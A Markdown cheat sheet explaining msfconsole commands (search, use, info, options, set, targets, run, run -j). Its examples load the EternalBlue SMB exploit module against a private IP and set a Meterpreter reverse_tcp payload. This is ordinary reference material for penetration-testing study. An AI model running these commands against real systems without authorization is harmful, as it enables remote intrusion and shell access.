### search
***explanation:*** **searches for modules, exploits, payloads, or scanners matching a specific keyword, CVE, or path.**
***usage(1):*** **search smb**
***usage(2):*** **search type:exploit platform:windows smb**
### use
***explanation:*** **selects a specific module and loads it into the active console context for configuration.**
***usage(1):*** **use exploit/windows/smb/ms17_010_eternalblue**
***usage(2):*** **use 0**
### info
***explanation:*** **displays detailed information about a module, including authors, CVE references, supported targets, and a description of how the exploit works.**
***usage(1):*** **info**
***usage(2):*** **info exploit/windows/smb/ms17_010_eternalblue**
### options
***explanation:*** **lists all available configuration parameters (both required and optional) for the currently active module so you know what variables to set.**
***usage:*** **options**
### set
***explanation:*** **assigns a specific value to a required or optional parameter within the currently loaded module.**
***usage(1):*** **set RHOSTS 192.168.1.50**
***usage(2):*** **set PAYLOAD windows/x64/meterpreter/reverse_tcp**
### targets 
***explanation:*** **lists the available target operating systems, architectures, or specific software versions supported by the currently loaded exploit module.** 
***usage(1):*** **show targets** 
***usage(2):*** **set target 1**
### run
***explanation:*** **executes the currently active and configured module against the target (interchangeable with the 'exploit' command).**
***usage(1):*** **run**
***usage(2):*** **run -j**
### run -j (or exploit -j)
***explanation:*** **executes the module in the background as a job. This frees up your prompt, allowing you to continue using msfconsole to configure other modules or catch other shells while the current one runs silently.**
***usage(1):*** **run -j**
***usage(2):*** **exploit -j**
